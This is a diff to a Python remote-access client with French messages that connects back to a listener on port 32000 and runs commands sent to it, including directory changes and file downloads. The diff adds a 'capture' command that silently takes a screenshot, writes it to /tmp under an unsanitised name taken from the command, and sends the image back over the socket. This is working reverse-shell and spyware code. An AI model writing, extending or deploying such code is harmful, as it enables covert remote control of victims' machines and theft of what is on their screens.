@@ -3,6 +3,7 @@ import time
 import subprocess
 import os
 import platform
+import pyscreenshot as ImageGrab
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 32000
@@ -38,6 +39,16 @@ while True:
             reponse_encodee = f"Répertoire changé : {os.getcwd()}\n".encode()
         except FileNotFoundError:
             reponse_encodee = "ERREUR : ce répertoire n'existe pas\n".encode()
+
+    elif len(commande_split) == 2 and commande_split[0] == "capture":
+        capture_filename = "/tmp/" + commande_split[1] + ".png"
+        capture_ecran = ImageGrab.grab()
+        capture_ecran.save(capture_filename, "PNG")
+        try:
+            with open(capture_filename, "rb") as f:
+                reponse_encodee = f.read()
+        except FileNotFoundError:
+            reponse_encodee = "ERREUR : capture d'écran non trouvée\n".encode()
 
     elif len(commande_split) == 2 and commande_split[0] == "dl":
         try:
